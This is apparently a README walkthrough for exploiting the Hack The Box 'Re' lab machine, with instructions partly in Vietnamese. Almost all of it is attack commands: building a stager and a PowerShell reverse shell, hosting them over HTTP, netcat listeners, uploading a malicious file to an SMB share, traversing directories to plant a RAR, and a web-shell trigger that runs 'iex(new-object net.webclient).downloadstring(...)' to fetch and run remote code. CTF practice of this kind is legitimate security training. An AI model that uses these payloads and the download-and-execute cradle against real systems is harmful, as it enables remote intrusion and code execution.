# HTB RE Initial Script

HTB RE: `https://app.hackthebox.com/machines/Re`

## Build Payload
    
Command:

   ```sh
   python3 re-payload.py --host <listener_ip> --port <listener_port>
   ```
Result:
- `malicious.obs`: stager script
- `shell.ps1`: reverse shell script

## Run Exploit
### Phase 1 (Luke)
1. Setup server để host file `shell.ps1`
   ```sh
   sudo python3 -m http.server 80
   ```
2. Setup listener
   ```sh
   nc -lvnp <listener_port>
   ```
3. Kết nối đến SMB share
   ```sh
   smbclient -N //<target_ip>/malware_dropbox
   ```
4. Trigger exploit
   ```sh
   put malicious.obs
   ```
### Phase 2 (Luke -> IIS)
1. Get file `malicious.rar`
   ```sh
   cd ../../../users/luke/documents/ods
   wget <listener_ip>/malicious.rar -outfile malicious.rar
   ```
2. Setup listener
   ```sh
   nc -lvnp <listener_port>
   ```
3. Go to `http://re.htb/shell.aspx`
   - Note: add `'<target_ip> re.htb'` to `/etc/hosts`
4. Trigger exploit
   - Program: `powershell`
   - Arguments: `iex(new-object net.webclient).downloadstring('http://<listener_ip>/shell.ps1')`

